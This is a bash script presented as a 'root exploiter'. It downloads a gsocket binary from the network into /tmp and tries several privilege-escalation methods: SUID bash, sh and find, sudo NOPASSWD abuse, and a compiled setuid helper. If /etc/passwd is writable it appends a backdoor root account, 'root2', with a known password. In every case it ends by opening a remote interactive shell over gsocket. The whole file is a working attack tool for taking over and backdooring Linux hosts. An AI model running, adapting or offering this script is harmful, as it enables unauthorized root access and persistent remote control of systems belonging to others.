#!/bin/bash
# groot_fixed.sh

echo "╔══════════════════════════════════════╗"
echo "║    GROOT - FIXED ROOT EXPLOITER      ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Generate key
KEY="ROOT_$(date +%s)"
echo "[*] Session Key: $KEY"
echo ""

# Cleanup and download gsocket FRESH
echo "[1] Preparing environment..."
pkill -f "gsocket\|gs-netcat" 2>/dev/null
sleep 2

# Download gsocket binary directly
echo "[2] Downloading gsocket binary..."
cd /tmp
rm -f gsocket.bin 2>/dev/null
curl -fsSL https://gsocket.io/x -o gsocket.bin || wget -q https://gsocket.io/x -O gsocket.bin
chmod +x gsocket.bin 2>/dev/null

if [ ! -f gsocket.bin ]; then
    echo "[-] Failed to download gsocket"
    exit 1
fi

GS_CMD="/tmp/gsocket.bin"
echo "[+] Gsocket ready: $GS_CMD"
echo ""

# REAL EXPLOITATION
echo "[3] Starting exploitation..."
echo "=========================================="

# Method 1: SUID BASH
if [ -u "/bin/bash" ]; then
    echo "[+] EXPLOIT: SUID bash found!"
    echo "[>] Getting root shell..."
    exec $GS_CMD -s "$KEY" /bin/bash -p -i
fi

# Method 2: SUID SH
if [ -u "/bin/sh" ]; then
    echo "[+] EXPLOIT: SUID sh found!"
    echo "[>] Getting root shell..."
    exec $GS_CMD -s "$KEY" /bin/sh -p -i
fi

# Method 3: SUDO
echo "[*] Checking sudo permissions..."
SUDO_OUT=$(sudo -l 2>/dev/null)
if echo "$SUDO_OUT" | grep -q "(ALL)"; then
    echo "[+] EXPLOIT: Sudo ALL found!"
    echo "[>] Executing sudo gsocket..."
    exec sudo $GS_CMD -s "$KEY" /bin/bash -i
fi

# Method 4: Check specific sudo commands
if echo "$SUDO_OUT" | grep -q "NOPASSWD"; then
    echo "[+] EXPLOIT: Sudo NOPASSWD found!"
    CMD=$(echo "$SUDO_OUT" | grep "NOPASSWD" | head -1 | awk -F: '{print $2}' | awk '{print $1}')
    echo "[>] Can run without password: $CMD"
    exec sudo $CMD -c "$GS_CMD -s $KEY /bin/bash -i"
fi

# Method 5: SUID FIND
if [ -u "/usr/bin/find" ]; then
    echo "[+] EXPLOIT: SUID find found!"
    echo "[>] Executing find exploit..."
    /usr/bin/find . -exec $GS_CMD -s "$KEY" /bin/bash -p \\; -quit &
    sleep 3
fi

# Method 6: CREATE AND RUN SUID BINARY
echo "[*] Creating custom exploit binary..."
cat > /tmp/groot_exploit.c << 'EOF'
#include <unistd.h>
#include <stdio.h>
int main() {
    printf("[GROOT] Attempting privilege escalation...\n");
    
    // Try to setuid to root
    if (setuid(0) == 0) {
        printf("[+] Success! Now root (UID: %d)\n", getuid());
        
        // Execute command to get shell
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "/tmp/gsocket.bin -s %s /bin/bash -p -i", "KEY_PLACEHOLDER");
        system(cmd);
    } else {
        printf("[-] Failed to get root (UID: %d)\n", getuid());
        // Try user shell
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "/tmp/gsocket.bin -s %s /bin/bash -i", "KEY_PLACEHOLDER");
        system(cmd);
    }
    return 0;
}
EOF

# Replace placeholder with actual key
sed -i "s/KEY_PLACEHOLDER/$KEY/" /tmp/groot_exploit.c

# Compile
if command -v gcc >/dev/null; then
    echo "[*] Compiling exploit..."
    gcc /tmp/groot_exploit.c -o /tmp/groot_exploit 2>/dev/null
    
    if [ -f /tmp/groot_exploit ]; then
        chmod +x /tmp/groot_exploit
        echo "[*] Running custom exploit..."
        /tmp/groot_exploit &
        sleep 2
    fi
fi

# Method 7: CHECK FOR EASY WRITES
echo "[*] Checking for quick wins..."
if [ -w /etc/passwd ]; then
    echo "[+] CRITICAL: /etc/passwd is writable!"
    echo "[>] Adding root user..."
    echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
    echo "[+] Added root2 with password: password"
fi

# Method 8: CHECK SSH KEYS
echo "[*] Checking SSH access..."
if [ -d ~/.ssh ]; then
    echo "[*] SSH directory exists"
    if [ -w ~/.ssh/authorized_keys ]; then
        echo "[+] SSH authorized_keys is writable!"
        echo "[>] You can add your SSH key for access"
    fi
fi

# Method 9: START USER SHELL
echo "[-] No privilege escalation found"
echo "[*] Starting user shell..."
echo "[*] Connect from your machine with:"
echo "    /tmp/gsocket.bin -s $KEY"
echo "=========================================="
exec $GS_CMD -s "$KEY" /bin/bash -i
